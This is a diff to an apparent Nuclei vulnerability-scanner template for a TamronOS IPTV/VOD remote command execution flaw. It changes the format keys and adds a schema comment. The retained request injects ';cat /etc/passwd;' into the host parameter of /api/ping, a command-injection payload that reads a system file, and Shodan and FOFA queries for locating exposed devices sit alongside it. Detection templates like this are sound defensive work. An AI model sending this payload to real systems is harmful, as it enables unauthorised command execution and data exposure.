@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: tamronos-rce
 info:
   name: TamronOS IPTV/VOD - Remote Command Execution
@@ -16,7 +17,7 @@ info:
     shodan-query: title:"TamronOS IPTV系统"
     fofa-query: title="TamronOS IPTV系统"
   tags: tamronos,rce
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp"
